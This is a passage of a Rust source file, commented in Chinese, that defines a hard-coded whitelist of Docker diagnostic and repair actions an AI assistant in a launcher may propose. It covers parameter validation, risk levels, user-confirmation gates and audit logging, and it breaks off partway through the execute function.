//! 动作白名单（I4 §三）。
//!
//! ## 这一层存在的全部理由
//!
//! AI 诊断助手要能「动手」才有用，但**绝不能执行模型自由生成的命令文本**。
//! 所以模型能做的只有一件事：从下面这张写死的表里挑一个 id，填几个受检的参数。
//! 表里没有的 id 一律拒绝并记一条 warn 日志 ——
//! 这不是「模型大概不会这么干」的君子协定，是执行路径上唯一的入口。
//!
//! 参数也一个个校验：`app` 必须是认得的那四种运行时之一，`registry` 必须是
//! [`crate::registry`] 里真有的候选源，`path` 必须真的存在且可执行，
//! `lines` 有上限。校验不过就是拒绝，不做「尽量猜一个」。
//!
//! ## 只读 / 改动系统
//!
//! | 类别 | 处理 |
//! |---|---|
//! | [`Kind::ReadOnly`] | 自动执行，不打扰用户 |
//! | [`Kind::Mutating`] | **把将要执行的完整命令原样展示**，配「要做什么 + 为什么」，用户点确认才执行 |
//!
//! 「完整命令」由 [`ActionCall::command`] 给出，和真正 `spawn` 出去的那个
//! 参数数组是**同一个来源**（见 [`Plan`]）—— 展示一套、执行另一套是最糟的骗法。

use std::collections::BTreeMap;
use std::time::Duration;

use serde::{Deserialize, Serialize};

use crate::assist::guard::{self, Level, Mode};
use crate::err::{AppError, AppResult, Code};
use crate::runtime::which;

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
pub enum Kind {
    /// 只看不改，自动执行
    ReadOnly,
    /// 会改动这台机器，必须用户点确认
    Mutating,
}

/// 白名单里的一条。
#[derive(Debug, Clone, Copy)]
pub struct Spec {
    pub id: &'static str,
    /// 风险级别（I5 动作表 v2）。`auto` 档下 `Safe` 直接执行、`Sensitive` 仍然要问，
    /// 判定在 [`Mode::needs_confirm`]，**不在界面里**
    pub level: Level,
    /// 要做什么（给用户看的一句话）
    pub title: &'static str,
    /// 为什么要做（给用户看的一句话）
    pub why: &'static str,
    /// 给模型看的说明
    pub desc: &'static str,
    /// 参数名 → 说明。没有参数就是空
    pub params: &'static [(&'static str, &'static str)],
    /// **只有用户自己开口要，才允许执行**（I8）。
    ///
    /// 这一位是 I8 把「全自动档下 `Sensitive` 不再问用户」之后补上的。
    /// 在那之前，「要不要问一句」这件事同时兜住了两类完全不同的动作：
    ///
    /// | 类别 | 例子 | 不问用户行不行 |
    /// |---|---|---|
    /// | 风险高，但**方向是对的** | `install_runtime`（装一套运行时） | 行 —— 守卫 + 复核员把关后自己做 |
    /// | 风险不高，但**方向该由用户定** | `reuse_existing_hunter`（改成用你已有的那套） | **不行** |
    ///
    /// 取消第四道门之后，第二类就裸奔了：模型提一句「你已经有一套了，用它吧」，
    /// 启动器就真的不装了、改去管用户那一套 —— 而用户什么都没说过。
    /// 用户 2026-09-21 22:35 定的是**自动选「并存、换端口」**，正好相反。
    ///
    /// 所以这一位是**档位管不着的**：无论哪一档，`user_only` 的动作只有在调用方
    /// 拿得出「用户自己要的」这个事实（`confirmed = true`）时才执行。
    /// 总指挥在全自动档下对这类动作**永远不给 `confirmed`**。
    pub user_only: bool,
}

/// **全部**可执行动作。这张表之外的一律拒绝。
pub const ACTIONS: &[Spec] = &[
    // ── 只读 ──────────────────────────────────────────────────────────
    Spec {
        id: "probe_docker_path",
        level: Level::ReadOnly,
        title: "重新按已知位置找一遍 docker",
        why: "macOS 的 GUI 程序拿不到终端里的 PATH，得按已知安装位置挨个探",
        desc: "重新探测 docker 可执行文件，返回按顺序探过的每一个位置与结果（存在 / 不存在 / 没有可执行位），以及最终用的是哪一条。",
        params: &[],
        user_only: false,
    },
    Spec {
        id: "docker_version",
        level: Level::ReadOnly,
        title: "跑一次 docker version",
        why: "客户端与服务端版本能同时判断「装没装」和「daemon 起没起」",
        desc: "执行 `docker version`，返回原始输出与退出码。",
        params: &[],
        user_only: false,
    },
    Spec {
        id: "compose_config",
        level: Level::ReadOnly,
        title: "校验 compose 配置",
        why: "配置里有语法错或变量没展开时，up 会在很后面才失败",
        desc: "执行 `docker compose config --quiet`，返回原始输出与退出码。",
        params: &[],
        user_only: false,
    },
    Spec {
        id: "read_log_tail",
        level: Level::ReadOnly,
        title: "读启动器日志的末尾",
        why: "失败的原话通常就在日志最后几行",
        desc: "读 ~/.hunter/logs/launcher.log 的最后 N 行（已脱敏）。参数 lines：1–200。",
        params: &[("lines", "行数，1–200")],
        user_only: false,
    },
    Spec {
        id: "check_ports",
        level: Level::ReadOnly,
        title: "查端口占用",
        why: "3100 / 8100 这些端口被别的程序占着时，容器起不来",
        desc: "检查 Hunter 要用的 5 个端口现在空不空，返回每个端口的状态。",
        params: &[],
        user_only: false,
    },
    Spec {
        id: "check_disk",
        level: Level::ReadOnly,
        title: "查磁盘余量",
        why: "六个镜像解压后要几个 GB，盘满了拉取会在半路失败",
        desc: "检查工作目录所在分区的剩余空间。",
        params: &[],
        user_only: false,
    },
    Spec {
        id: "list_runtime_apps",
        level: Level::ReadOnly,
        title: "看容器运行时装没装、起没起",
        why: "「装了但没启动」和「根本没装」要给完全不同的建议",
        desc: "检查 OrbStack / Docker Desktop / Colima / systemd 的 docker 服务，分别报「装没装」与「进程起没起」。",
        params: &[],
        user_only: false,
    },
    // ── 改动系统（必须用户确认） ──────────────────────────────────────
    Spec {
        id: "start_runtime",
        level: Level::Safe,
        title: "启动容器运行时",
        why: "Docker 客户端在、只是后台服务没起来时，把它拉起来就好了",
        desc: "启动指定的容器运行时。参数 app 只能是：orbstack / docker-desktop / colima / systemd。",
        params: &[("app", "orbstack | docker-desktop | colima | systemd")],
        user_only: false,
    },
    Spec {
        id: "set_docker_path",
        level: Level::Safe,
        title: "把 docker 的路径写进设置",
        why: "docker 装在不常见的位置时，指一次以后就不用再探了",
        desc: "把 docker 可执行文件的绝对路径写进 ~/.hunter/launcher.toml 的 [runtime] docker_path。路径必须真实存在且可执行，否则拒绝。参数 path。",
        params: &[("path", "docker 可执行文件的绝对路径")],
        user_only: false,
    },
    Spec {
        id: "switch_registry",
        level: Level::Safe,
        title: "换一个镜像源",
        why: "国内直连 ghcr.io 经常超时，换成腾讯云香港的镜像一般就通了",
        desc: "切换镜像源并写进设置。参数 registry 只能是候选源的 id（用 list 里给出的那些）。",
        params: &[("registry", "镜像源 id")],
        user_only: false,
    },
    Spec {
        id: "restart_stack",
        level: Level::Safe,
        title: "重启 Hunter 的容器",
        why: "配置改过之后要重新 up 一次才生效",
        desc: "执行 `docker compose up -d`，让改过的配置生效。",
        params: &[],
        user_only: false,
    },
    Spec {
        id: "remap_ports",
        level: Level::Safe,
        title: "重新分配被占用的端口",
        why: "端口被别的程序占着时，换一组空闲端口就能起来",
        desc: "重新检测端口冲突并把空闲端口写进配置与覆盖文件。",
        params: &[],
        user_only: false,
    },
    Spec {
        id: "brew_install",
        level: Level::Sensitive,
        title: "用 Homebrew 装一个东西",
        why: "mac 上缺的组件多数能一条 brew 命令补上",
        desc: "执行 `brew install <formula>`。formula 只能是：docker / docker-compose / colima / docker-buildx。只在 macOS 上可用。",
        params: &[("formula", "docker | docker-compose | colima | docker-buildx")],
        user_only: false,
    },
    // ── I5 动作表 v2 新增（设计文档 §五） ─────────────────────────────────
    Spec {
        id: "probe_network",
        level: Level::ReadOnly,
        title: "测一遍各个下载源的连通与快慢",
        why: "拉不动的时候要先知道是哪个源不通，而不是一直重试同一个",
        desc: "对每个候选镜像源发一次 manifest 请求，返回可用与否和耗时（毫秒）。",
        params: &[],
        user_only: false,
    },
    Spec {
        id: "read_container_logs",
        level: Level::ReadOnly,
        title: "读某个服务的容器日志",
        why: "容器起来又退出时，退出的原因只在它自己的日志里",
        desc: "读**本项目**某个服务最后 N 行日志（已脱敏）。service 只能是 api / llm-shim / opencode / postgres / redis / web；lines 1–200。",
        params: &[
            ("service", "api | llm-shim | opencode | postgres | redis | web"),
            ("lines", "行数，1–200"),
        ],
        user_only: false,
    },
    Spec {
        id: "list_other_hunter_installs",
        level: Level::ReadOnly,
        title: "看这台机器上还有没有别的 Hunter",
        why: "端口被占常常是因为用户自己早就装过一套，不查清楚就会把原因猜错",
        desc: "列出本机上镜像名含 hunter-community- 、但 compose 项目名不是 hunter 的其他安装，以及它们占着的端口。",
        params: &[],
        user_only: false,
    },
    Spec {
        id: "wait_daemon",
        level: Level::ReadOnly,
        title: "等 Docker 起来",
        why: "点开 OrbStack / Docker Desktop 之后守护进程要几十秒才就绪",
        desc: "轮询 docker version 直到服务端可用或超时。参数 seconds：5–120。",
        params: &[("seconds", "最多等多少秒，5–120")],
        user_only: false,
    },
    Spec {
        id: "retry_pull",
        level: Level::Safe,
        title: "退避之后重新拉镜像",
        why: "网络抖一下就失败的拉取，等几秒再来通常就过了",
        desc: "等待若干秒后重新执行 docker compose pull。参数 delay_seconds：0–60。",
        params: &[("delay_seconds", "先等多少秒，0–60")],
        user_only: false,
    },
    Spec {
        id: "compose_down_own",
        level: Level::Safe,
        title: "把 Hunter 自己的容器停掉并移除",
        why: "配置换过之后，旧容器带着旧端口，必须先拆掉再重建",
        desc: "对**本项目** hunter 执行 docker compose down（**不带 -v**，数据卷一律保留）。不会碰这台机器上别的容器。",
        params: &[],
        user_only: false,
    },
    Spec {
        id: "remove_own_stale_containers",
        level: Level::Safe,
        title: "清掉 Hunter 自己的残留容器",
        why: "上一次起到一半失败会留下「已创建未启动」的容器，它们带着旧端口",
        desc: "删除**本项目** hunter 中状态为 created 的容器（删之前逐个核对 compose 项目标签）。不带 -v，数据卷保留。",
        params: &[],
        user_only: false,
    },
    Spec {
        id: "restart_own_service",
        level: Level::Safe,
        title: "重启 Hunter 的某一个服务",
        why: "单个服务卡住时，重建它比把整套推倒重来快得多",
        desc: "重新创建**本项目**的某一个服务。service 只能是 api / llm-shim / opencode / postgres / redis / web。",
        params: &[("service", "api | llm-shim | opencode | postgres | redis | web")],
        user_only: false,
    },
    Spec {
        id: "raise_timeouts",
        level: Level::Safe,
        title: "把等待时间调长",
        why: "机器慢的时候 180 秒不够，调长比反复重试有用",
        desc: "把健康检查的等待上限写进 launcher.toml。参数 seconds：180–900。",
        params: &[("seconds", "健康检查等待上限，180–900 秒")],
        user_only: false,
    },
    Spec {
        id: "probe_cred_helper",
        level: Level::ReadOnly,
        title: "查一下本机的 docker 凭据助手",
        why: "拉不动公开镜像时，第一件要分清的事是「源不通」还是「本机取不到凭据」",
        desc: "只读地看 ~/.docker/config.json 里配的 credsStore / credHelpers，并在补全后的 PATH 上找一遍那几个可执行文件。**不读 auths 里的任何值**。",
        params: &[],
        user_only: false,
    },
    Spec {
        id: "use_isolated_docker_config",
        level: Level::Safe,
        title: "另起一份不带凭据助手的 docker 配置",
        why: "补全 PATH 之后仍然找不到 docker-credential-* 时，拉公开镜像根本不需要凭据",
        desc: "在 ~/.hunter/docker-config/ 里生成一份去掉 credsStore / credHelpers / auths 的配置，之后所有 docker 子进程用 DOCKER_CONFIG 指过去。**用户的 ~/.docker/config.json 一个字节都不改**（守卫会拦）。",
        params: &[],
        user_only: false,
    },
    // ── I7 动作表（设计文档 §五的最后两条） ─────────────────────────────
    Spec {
        id: "install_runtime",
        level: Level::Sensitive,
        title: "装一套容器运行时",
        why: "这台机器上没有 Docker，没有它 Hunter 的六个服务一个都起不来",
        desc: "替用户把 Docker 装好并启动。按顺序自动试三条路：①内置运行时（Colima + Lima + docker 客户端 + compose + 虚拟机镜像，               全部按写死的 sha256/sha512 校验，装在 ~/.hunter/runtime，不要管理员密码、可一键卸载）；               ②OrbStack 官方安装包（验苹果签名与公证后安装并打开）；③Homebrew（没有就先装 brew）再装 OrbStack。               前一条失败才走下一条，全部由启动器执行。本机已有 OrbStack / Docker Desktop 在跑时不会执行。没有参数。",
        params: &[],
        user_only: false,
    },
    Spec {
        id: "start_builtin_runtime",
        level: Level::Safe,
        title: "启动内置运行时的虚拟机",
        why: "内置运行时装好了，但它的虚拟机没在跑",
        desc: "对已经装好的内置运行时执行 colima start（profile 固定为 hunter），               并把 DOCKER_HOST 指到它的 socket。没有参数。",
        params: &[],
        user_only: false,
    },
    Spec {
        id: "uninstall_builtin_runtime",
        level: Level::Safe,
        title: "卸载内置运行时",
        why: "用户不想要这套内置运行时了，或者要重装一遍",
        desc: "删掉 colima 的 hunter profile（连同它的虚拟机磁盘）并清空 ~/.hunter/runtime。               只动 ~/.hunter 里的东西，不碰本机别的 Docker。没有参数。",
        params: &[],
        user_only: false,
    },
    Spec {
        id: "reuse_existing_hunter",
        level: Level::Sensitive,
        title: "改为管理你已经装好的那一套 Hunter",
        why: "这台机器上已经有一套在跑，再装一套要多占几个 G 和五个端口",
        desc: "把本机上已有的那个 compose 项目记进设置，启动器改为管理它（看状态、看日志、打开网页），               不再另装一套。**不会**改它的配置、不会删它的卷；停止 / 重启这类操作以后每一次都要用户再确认。               参数 project 必须是侦察员报出来的那几个项目名之一。               **这一条只有用户自己开口要才会执行**：默认永远是「两套并存、换一组端口」。",
        params: &[("project", "已有的那个 compose 项目名")],
        user_only: true,
    },
    Spec {
        id: "export_feedback_bundle",
        level: Level::Safe,
        title: "生成一份脱敏诊断包",
        why: "实在修不好时，把现场打包好，用户一键就能发给开发者",
        desc: "把日志与配置脱敏后打成 zip，放到 ~/.hunter/diagnostics/，返回文件路径。",
        params: &[],
        user_only: false,
    },
];

impl Spec {
    /// I4 的两分法（只读 / 改动系统）。界面还在用，由 `level` 推出，不再单独存一份。
    pub fn kind(&self) -> Kind {
        match self.level {
            Level::ReadOnly => Kind::ReadOnly,
            Level::Safe | Level::Sensitive => Kind::Mutating,
        }
    }
}

pub fn spec(id: &str) -> Option<&'static Spec> {
    ACTIONS.iter().find(|a| a.id == id)
}

/// 模型（或规则层）提出的一次动作调用。
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Call {
    pub id: String,
    #[serde(default)]
    pub args: BTreeMap<String, String>,
}

impl Call {
    pub fn new(id: &str) -> Self {
        Self {
            id: id.to_string(),
            args: BTreeMap::new(),
        }
    }
    pub fn with(id: &str, k: &str, v: &str) -> Self {
        let mut c = Self::new(id);
        c.args.insert(k.to_string(), v.to_string());
        c
    }
}

/// 校验通过之后的**执行计划**。
///
/// 展示给用户看的命令和真正跑的命令都从这里取 —— 一个来源，没有第二份。
#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct Plan {
    pub id: String,
    pub kind: Kind,
    /// I5 的三级风险。界面按它决定要不要出「需要你」卡片
    pub level: Level,
    pub title: String,
    pub why: String,
    /// 将要执行的完整命令（参数数组）。不是子进程的动作（写配置文件之类）时为空，
    /// 由 [`Plan::summary`] 说清到底要改什么
    pub argv: Vec<String>,
    /// 不跑子进程的动作在这里说明它要干什么（例如「往 launcher.toml 写 docker_path = …」）
    pub summary: Option<String>,
    /// 方向该由用户定的动作（见 [`Spec::user_only`]）。原样抄自动作表
    pub user_only: bool,
}

impl Plan {
    /// 原样展示用的一行命令。**只用于显示**，执行走的是 `argv`（红线 3：不拼 shell 字符串）。
    pub fn command_line(&self) -> String {
        if self.argv.is_empty() {
            return self.summary.clone().unwrap_or_default();
        }
        self.argv
            .iter()
            .map(|a| {
                if a.contains(' ') {
                    format!("\"{a}\"")
                } else {
                    a.clone()
                }
            })
            .collect::<Vec<_>>()
            .join(" ")
    }
}

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct Outcome {
    pub id: String,
    pub ok: bool,
    /// 给人看、也给模型看的结果正文（**已脱敏**）
    pub text: String,
}

const REGISTRY_IDS_HINT: &str = "候选源 id 见启动器设置页";

/// 校验一次调用并生成执行计划。**拒绝就是拒绝，不猜参数**。
pub fn plan(call: &Call) -> AppResult<Plan> {
    let Some(s) = spec(&call.id) else {
        // 这一条会在真实运行里被打出来。I4 的安全用例就是靠它确认「白名单外的被拒了」
        crate::lwarn!(
            "AI 诊断助手提出了白名单之外的动作，已拒绝：id={}（参数 {:?}）",
            crate::redact::redact(&call.id),
            call.args.keys().collect::<Vec<_>>()
        );
        return Err(AppError::new(
            Code::NotImplemented,
            format!("动作「{}」不在白名单里，已拒绝执行。", safe_id(&call.id)),
        ));
    };

    let mut p = Plan {
        id: s.id.to_string(),
        kind: s.kind(),
        level: s.level,
        title: s.title.to_string(),
        why: s.why.to_string(),
        argv: Vec::new(),
        summary: None,
        user_only: s.user_only,
    };

    match s.id {
        "probe_docker_path" => {
            p.summary = Some("按已知位置重新探测 docker，不改动任何东西".into());
        }
        "docker_version" => p.argv = vec![which::docker_bin(), "version".into()],
        "compose_config" => {
            let (prog, mut args) = crate::compose::argv(&["config", "--quiet"]);
            p.argv = vec![prog];
            p.argv.append(&mut args);
        }
        "read_log_tail" => {
            let n = num_arg(call, "lines", 1, 200)?;
            p.summary = Some(format!("读启动器日志的最后 {n} 行"));
        }
        "check_ports" => p.summary = Some("检查 5 个端口现在空不空".into()),
        "check_disk" => p.summary = Some("检查工作目录所在分区的剩余空间".into()),
        "list_runtime_apps" => {
            p.summary = Some("检查 OrbStack / Docker Desktop / Colima / systemd docker".into())
        }
        "start_runtime" => {
            let app = enum_arg(call, "app", RUNTIME_APPS)?;
            p.argv = start_runtime_argv(&app)?;
            p.title = format!("启动 {}", runtime_label(&app));
        }
        "set_docker_path" => {
            let path = path_arg(call, "path")?;
            p.summary = Some(format!(
                "往 ~/.hunter/launcher.toml 的 [runtime] 段写 docker_path = \"{path}\""
            ));
        }
        "switch_registry" => {
            let id = call
                .args
                .get("registry")
                .map(|s| s.trim().to_string())
                .unwrap_or_default();
            let cand = crate::registry::by_id(&id).ok_or_else(|| {
                AppError::new(
                    Code::NotImplemented,
                    format!(
                        "镜像源 id「{}」不在候选里（{REGISTRY_IDS_HINT}）。",
                        safe_id(&id)
                    ),
                )
            })?;
            p.summary = Some(format!(
                "把镜像源切成「{}」（{}），写进 launcher.toml 与 .env",
                cand.label, cand.prefix
            ));
            p.title = format!("换镜像源到 {}", cand.label);
        }
        "restart_stack" => {
            let (prog, mut args) = crate::compose::argv(&["up", "-d"]);
            p.argv = vec![prog];
            p.argv.append(&mut args);
        }
        "remap_ports" => {
            p.summary = Some("重新检测端口冲突，把空闲端口写进 launcher.toml 与覆盖文件".into())
        }
        "brew_install" => {
            if !cfg!(target_os = "macos") {
                return Err(AppError::new(
                    Code::NotImplemented,
                    "brew install 只在 macOS 上可用。".to_string(),
                ));
            }
            let f = enum_arg(call, "formula", BREW_FORMULAS)?;
            let brew = which::resolve("brew").resolved.ok_or_else(|| {
                AppError::new(
                    Code::NotImplemented,
                    "这台机器上没找到 brew（探了 /opt/homebrew/bin 与 /usr/local/bin）。"
                        .to_string(),
                )
            })?;
            p.argv = vec![brew, "install".into(), f];
        }
        // ── I5 动作表 v2 ────────────────────────────────────────────────
        "probe_network" => {
            p.summary = Some("对每个候选镜像源发一次 manifest 请求，测连通与耗时".into())
        }
        "read_container_logs" => {
            let svc = enum_arg(call, "service", guard::OWN_SERVICES)?;
            let n = num_arg(call, "lines", 1, 200)?;
            p.summary = Some(format!("读本项目 {svc} 服务的最后 {n} 行日志"));
        }
        "list_other_hunter_installs" => {
            p.summary = Some("列出这台机器上别的 Hunter 安装与它们占着的端口".into())
        }
        "wait_daemon" => {
            let n = num_arg(call, "seconds", 5, 120)?;
            p.summary = Some(format!("轮询 docker version，最多等 {n} 秒"));
        }
        "retry_pull" => {
            let n = num_arg(call, "delay_seconds", 0, 60)?;
            p.summary = Some(format!("等 {n} 秒后重新执行 docker compose pull"));
        }
        "compose_down_own" => {
            // **不带 -v**。守卫那边也拦，这里是第一道
            let (prog, mut args) = crate::compose::argv(&["down", "--remove-orphans"]);
            p.argv = vec![prog];
            p.argv.append(&mut args);
        }
        "remove_own_stale_containers" => {
            let stale = crate::compose::stale_own_containers();
            p.summary = Some(if stale.is_empty() {
                "本项目没有「已创建未启动」的残留容器".to_string()
            } else {
                format!(
                    "删掉本项目 {} 个残留容器：{}（不带 -v，数据卷保留）",
                    stale.len(),
                    stale
                        .iter()
                        .map(|c| c.name.as_str())
                        .collect::<Vec<_>>()
                        .join("、")
                )
            });
        }
        "restart_own_service" => {
            let svc = enum_arg(call, "service", guard::OWN_SERVICES)?;
            let (prog, mut args) = crate::compose::argv(&["up", "-d", "--force-recreate", &svc]);
            p.argv = vec![prog];
            p.argv.append(&mut args);
            p.title = format!("重建 {svc} 这个服务");
        }
        "raise_timeouts" => {
            let n = num_arg(call, "seconds", 180, 900)?;
            p.summary = Some(format!(
                "往 ~/.hunter/launcher.toml 的 [hunter] 段写 start_timeout_secs = {n}"
            ));
        }
        "probe_cred_helper" => {
            p.summary = Some("只读：看一眼 credsStore 配的是谁、那个可执行文件在不在".into())
        }
        "use_isolated_docker_config" => {
            p.summary = Some(format!(
                "在 {} 里生成一份去掉 credsStore / credHelpers / auths 的 docker 配置，\
                 之后用 DOCKER_CONFIG 指过去（用户的 ~/.docker/config.json 不动）",
                crate::redact::mask_home(&crate::dockercfg::isolated_dir().to_string_lossy())
            ))
        }
        // ── I7 ──────────────────────────────────────────────────────────
        "install_runtime" => {
            // 展示与执行同一个来源：这里写的顺序就是 `chain::routes()` 的顺序
            let routes = crate::runtime::chain::routes();
            if routes.is_empty() {
                return Err(AppError::new(
                    Code::NotImplemented,
                    crate::runtime::chain::platform_cannot_install(),
                ));
            }
            let missing = crate::runtime::builtin::missing_items();
            let bytes = crate::runtime::manifest::total_bytes(&missing);
            p.summary = Some(format!(
                "按顺序自动试这几条路：{}。第一条要下 {}，装在 {} 里，不要管理员密码、可一键卸载；\
                 前一条没走通才会走下一条，需要管理员权限的那一步会弹系统自己的密码框。",
                routes
                    .iter()
                    .enumerate()
                    .map(|(i, r)| format!("{}·{}", i + 1, r.label()))
                    .collect::<Vec<_>>()
                    .join(" → "),
                crate::assist::probe::human_bytes(bytes),
                crate::redact::mask_home(&crate::paths::runtime_dir().to_string_lossy()),
            ));
            p.title = "替你把 Docker 装好".into();
        }
        "start_builtin_runtime" => {
            let argv = crate::runtime::builtin::start_argv()?;
            p.argv = argv;
        }
        "uninstall_builtin_runtime" => {
            p.summary = Some(format!(
                "删掉 colima 的 {} profile 与 {}（都是启动器自己生成的）",
                crate::runtime::builtin::PROFILE,
                crate::redact::mask_home(&crate::paths::runtime_dir().to_string_lossy())
            ));
        }
        "reuse_existing_hunter" => {
            let want = call
                .args
                .get("project")
                .map(|s| s.trim().to_string())
                .unwrap_or_default();
            // **必须是侦察员真的看到过的那几个之一**。模型编一个项目名出来，
            // 到这里就断了（I5 那条「参数真实性」原则的又一处应用）
            let cands = crate::takeover::candidates();
            let c = cands.iter().find(|c| c.project == want).ok_or_else(|| {
                AppError::new(
                    Code::NotImplemented,
                    if cands.is_empty() {
                        "这台机器上并没有别的 Hunter 安装，没有可以接管的东西。".to_string()
                    } else {
                        format!(
                            "「{}」不在本机已有的 Hunter 里（看到的是：{}）。",
                            safe_id(&want),
                            cands
                                .iter()
                                .map(|c| c.project.as_str())
                                .collect::<Vec<_>>()
                                .join("、")
                        )
                    },
                )
            })?;
            p.summary = Some(format!(
                "把「{}」记进 launcher.toml，启动器改为管理它{}。不装新的一套，                 不改它的配置，任何情况下都不删它的卷。",
                c.project,
                if c.manageable() {
                    format!(
                        "（工作目录 {}）",
                        crate::redact::mask_home(&c.working_dir)
                    )
                } else {
                    "（读不到它的 compose 文件，所以只能看状态与日志）".to_string()
                }
            ));
            p.title = format!("直接用你已经装好的「{}」", c.project);
        }
        "export_feedback_bundle" => {
            p.summary = Some("把日志与配置脱敏后打包到 ~/.hunter/diagnostics/".into())
        }
        other => {
            // 上面的 match 与 ACTIONS 表必须同步；漏了一条就走到这里，如实报错
            return Err(AppError::new(
                Code::NotImplemented,
                format!("动作「{other}」在表里但还没实现。"),
            ));
        }
    }
    // **最后一道**：真要 spawn 的参数数组过一遍守卫。
    // 不管这条动作是谁提出来的、表里怎么写的，越界的命令到不了 `proc::run`
    if !p.argv.is_empty() {
        guard::argv(&p.argv)?;
    }
    Ok(p)
}

/// 真去执行（I4 的调用点：`confirm` 语义，改动类一律要用户点过确认）。
pub fn execute(call: &Call, confirmed: bool) -> AppResult<Outcome> {
    execute_as(call, Mode::Confirm, confirmed, guard::Proposer::User)
}

/// 真去执行（I5：带授权档位）。
///
/// 三道门，缺一不可：
/// 1. [`plan`] —— 动作在不在表里、参数合不合法、`argv` 过不过 [`guard::argv`]；
/// 2. 授权档位 —— [`Mode::needs_confirm`] 说要问而调用方没给 `confirmed`，就**不执行**；
/// 3. 各分支自己的守卫 —— 写文件过 [`guard::writable_path`]，动容器过 [`guard::own_container`]。
///
/// 这三道都在**执行路径上**，不在界面里 —— 界面可以有 bug，这一层不能有。
pub fn execute_as(
    call: &Call,
    mode: Mode,
    confirmed: bool,
    by: guard::Proposer,
) -> AppResult<Outcome> {
    let p = match plan(call) {
        Ok(p) => p,
        Err(e) => {
            guard::audit(&call.id, &call.args, by, None, &format!("拒绝：{}", e.msg));
            return Err(e);
        }
    };
    // **档位管不着的那一道**（I8）：方向该由用户定的动作，用户没开口就不执行。
    // 放在档位判定**之前** —— 全自动档下 `needs_confirm` 恒为 false，
    // 要是放在后面，这一道就永远走不到。
    if p.user_only && !confirmed {
        let e = AppError::new(
            Code::NotImplemented,
            format!(
                "「{}」这件事的方向该由用户自己定，他没开口，不执行。\
                 （默认做法是两套并存、给新装的换一组空闲端口。）",
                p.title
            ),
        );
        guard::audit(
            &call.id,
            &call.args,
            by,
            Some(p.level),
            "拒绝：用户没要求过这件事",
        );
        return Err(e);
    }
    if mode.needs_confirm(p.level) && !confirmed {
        let e = AppError::new(
            Code::NotImplemented,
            format!(
                "「{}」是「{}」级别的动作，在「{}」档下要你点过确认才执行。",
                p.title,
                p.level.cn(),
                mode.cn()
            ),
        );
        guard::audit(
            &call.id,
            &call.args,
            by,
            Some(p.level),
            "拒绝：还没得到确认",
        );
        return Err(e);
    }
    crate::linfo!(
        "诊断助手执行动作 {}（{:?} · {}）：{}",
        p.id,
        p.level,
        mode.as_str(),
        p.command_line()
    );
    let text = match p.id.as_str() {
        "probe_docker_path" => {
            which::invalidate();
            let pr = which::docker_probe();
            let mut s = format!("{}\n", pr.one_line());
            for l in pr.detail_lines() {
                s.push_str(&l);
                s.push('\n');
            }
            s
        }
        "read_log_tail" => {
            let n = num_arg(call, "lines", 1, 200)? as usize;
            crate::log::tail_file(n).join("\n")
        }
        "check_ports" => port_report(),
        "check_disk" => disk_report(),
        "list_runtime_apps" => super::probe::runtime_apps_text(),
        "set_docker_path" => {
            let path = path_arg(call, "path")?;
            let mut cfg = crate::config::LauncherConfig::load();
            cfg.runtime.docker_path = path.clone();
            cfg.save()?;
            which::invalidate();
            format!(
                "已写入 docker_path = \"{path}\"，重新探测的结果：{}",
                which::docker_probe().one_line()
            )
        }
        "switch_registry" => {
            let id = call.args.get("registry").cloned().unwrap_or_default();
            let cand = crate::registry::by_id(id.trim()).ok_or_else(|| {
                AppError::new(Code::NotImplemented, "镜像源 id 不在候选里".to_string())
            })?;
            let mut cfg = crate::config::LauncherConfig::load();
            cfg.apply_registry(cand);
            cfg.save()?;
            format!(
                "镜像源已切成「{}」（{}）。下一次拉取会从这里拉。",
                cand.label, cand.prefix
            )
        }
        "remap_ports" => {
            let mut cfg = crate::config::LauncherConfig::load();
            // **我们自己这一套**正占着的端口不算冲突 —— 否则每点一次就把端口往上挪一格，
            // 用户存的书签全会失效（M2 用例 9 实测过的老坑，这里不能再踩一次）
            let own: Vec<u16> = crate::compose::ps()
                .unwrap_or_default()
                .iter()
                .filter_map(|s| s.port)
                .collect();
            let (ports, changes) = crate::config::resolve_ports(&cfg.hunter.ports, &own)?;
            cfg.hunter.ports = ports.clone();
            cfg.save()?;
            crate::config::write_override(&ports, &cfg.hunter.base_prefix)?;
            if changes.is_empty() {
                "5 个端口都是空的，没有需要改的。".to_string()
            } else {
                let mut s = String::new();
                for c in &changes {
                    s.push_str(&format!("{}：{} → {}\n", c.service, c.wanted, c.actual));
                }
                s.push_str(
                    "已写进 launcher.toml 与 docker-compose.launcher.yml。改完要重启容器才生效。",
                );
                s
            }
        }
        // ── I5 动作表 v2 ────────────────────────────────────────────────
        "probe_network" => network_report(),
        "read_container_logs" => {
            let svc = enum_arg(call, "service", guard::OWN_SERVICES)?;
            let n = num_arg(call, "lines", 1, 200)? as usize;
            // compose::logs 内部已经走过脱敏
            crate::compose::logs(Some(&svc), n)?.join("\n")
        }
        "list_other_hunter_installs" => super::probe::other_installs_text(),
        "wait_daemon" => {
            let n = num_arg(call, "seconds", 5, 120)? as u64;
            wait_daemon(Duration::from_secs(n))
        }
        "retry_pull" => {
            let n = num_arg(call, "delay_seconds", 0, 60)? as u64;
            if n > 0 {
                std::thread::sleep(Duration::from_secs(n));
            }
            let r = crate::compose::run(&["pull"], Duration::from_secs(1800))?;
            if r.ok() {
                "重新拉取完成。".to_string()
            } else {
                // 这里跑的是 `pull` 不是 `up`，要用拉取那张归类表。
                // **两个流都要看**：stderr 空着的时候「原话」不能跟着空（I6）
                let text = {
                    let e = crate::compose::extract_error_text(&split_lines(&r.stderr));
                    if e.trim().is_empty() {
                        crate::compose::extract_error_text(&split_lines(&r.stdout))
                    } else {
                        e
                    }
                };
                return Err(AppError::new(
                    crate::compose::pull_error_code(&text),
                    crate::compose::classify_pull_error(&text, r.status),
                ));
            }
        }
        "probe_cred_helper" => cred_helper_report(),
        "use_isolated_docker_config" => {
            let out = crate::dockercfg::enable()?;
            let mut s = out.one_line();
            s.push_str("。拉公开镜像本来就不需要凭据，所以这样够用了。");
            if !out.not_linked.is_empty() {
                s.push_str(
                    "（没能带过来的那几项写在上面；万一 docker 因此连不上，\
                     把 ~/.hunter/launcher.toml 里 [runtime] isolated_docker_config 改回 false 即可）",
                );
            }
            s
        }
        "remove_own_stale_containers" => {
